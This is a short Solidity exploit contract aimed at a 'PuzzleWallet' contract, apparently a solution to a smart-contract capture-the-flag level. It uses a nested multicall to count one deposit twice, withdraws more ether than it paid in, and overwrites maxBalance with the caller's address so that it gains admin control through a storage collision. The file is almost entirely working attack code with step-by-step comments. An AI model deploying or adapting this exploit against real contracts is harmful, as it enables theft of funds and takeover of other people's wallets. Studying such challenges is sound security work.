// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract ExploitHelper {
    IPuzzleWallet public wallet;
    
    constructor(address _wallet) {
        wallet = IPuzzleWallet(_wallet);
    }
    
    function exploit() external payable {
        // Step 1: Double deposit using nested multicall
        bytes[] memory depositCallData = new bytes[](1);
        depositCallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        
        bytes[] memory nestedMulticallData = new bytes[](2);
        nestedMulticallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticallData[1] = abi.encodeWithSelector(wallet.multicall.selector, depositCallData);
        
        // This will deposit 0.001 ETH twice, giving us 0.002 ETH balance
        wallet.multicall{value: 0.001 ether}(nestedMulticallData);
        
        // Step 2: Withdraw all 0.002 ETH (original 0.001 + our 0.001)
        wallet.execute(msg.sender, 0.002 ether, "");
        
        // Step 3: Set maxBalance to our address
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}